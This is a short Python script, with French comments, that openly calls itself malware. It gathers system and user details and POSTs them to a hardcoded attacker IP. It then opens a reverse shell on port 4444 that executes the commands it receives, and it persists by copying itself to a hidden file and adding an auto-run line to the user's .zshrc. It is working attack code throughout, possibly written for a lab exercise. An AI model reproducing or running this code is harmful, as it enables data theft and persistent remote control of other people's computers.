import os
import shutil
import platform
import socket
import subprocess
from pathlib import Path
import requests

# ========== PARTIE 1 : COLLECTE INFOS + ENVOI ==========

def collect_info():
	info = {
	"OS": platform.system(),
	"OS Version": platform.version(),
	"Architecture": platform.machine(),
	"Hostname": socket.gethostname(),
	"IP Address": socket.gethostbyname(socket.gethostname()),
	"CPU": platform.processor(),
	"User": os.getlogin()
	}
	return info

def send_to_server(info):
	try:
		url = "http://192.168.19.120:8080/collect" # <----- Attacker's IP here
		formatted = "\n".join([f"{k}: {v}" for k, v in info.items()])
		requests.post(url, data=formatted, timeout=5)
		print("[+] Données envoyées au serveur.")
	except Exception as e:
		print(f"[-] Erreur d'envoi : {e}")


# ========== PARTIE 2 : REVERSE SHELL ==========

def reverse_shell():
	host = "192.168.19.120"
	port = 4444
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host, port))
		while True:
			command = s.recv(1024).decode()
			if command.lower() == "exit":
				break
			output = subprocess.getoutput(command)
			s.send(output.encode())
	except:
		pass
	finally:
		try:
			s.close()
		except:
			pass


# ========== PARTIE 3 : PERSISTENCE (.zshrc) ==========

def add_persistence():
	home = str(Path.home())
	hidden_path = os.path.join(home, ".local", ".hidden_malware.py")

	if not os.path.exists(hidden_path):
		try:
			shutil.copyfile(__file__, hidden_path)
			print(f"[+] Malware copié dans {hidden_path}")
		except Exception as e:
			print(f"[-] Erreur de copie : {e}")


	zshrc_path = os.path.join(home, ".zshrc")
	exec_line = f"python3 {hidden_path}\n"

	if os.path.exists(zshrc_path):
		with open(zshrc_path, "r") as f:
			lines = f.readlines()
		if exec_line not in lines:
			with open(zshrc_path, "a") as f:
				f.write(f"\n# Auto-run malware\n{exec_line}")
			print("[+] Persistence ajoutée à .zshrc")
		else:
			print("[=] Persistence déjà en place")
	else:
		print("[-] .zshrc introuvable")



# ========== MAIN ==========
if __name__ == "__main__":
	print("[*] Malware lancé.")
	info = collect_info()
	send_to_server(info)
	add_persistence()
	reverse_shell()





